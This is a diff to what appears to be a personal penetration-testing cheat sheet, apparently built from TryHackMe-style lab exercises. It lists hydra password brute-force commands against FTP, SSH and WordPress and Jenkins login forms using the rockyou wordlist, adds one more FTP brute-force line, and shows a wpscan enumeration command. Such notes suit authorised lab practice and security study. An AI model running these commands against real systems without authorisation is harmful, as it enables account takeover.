@@ -48,6 +48,7 @@ hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.158.58 ftp
 hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.67.168 ssh
 hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm http-post-form "/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:The password you entered" -f -V
 hydra -l admin -P rock9L.txt localhost -s 8081 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password" -f -V
+hydra -t 1 -l quinn -P /usr/share/wordlists/rockyou.txt -vV 10.10.215.65 -s 10021 ftp
 
 # wpscan 
 wpscan --url URL -e ap --plugins-detection aggresive -o OUTFILE
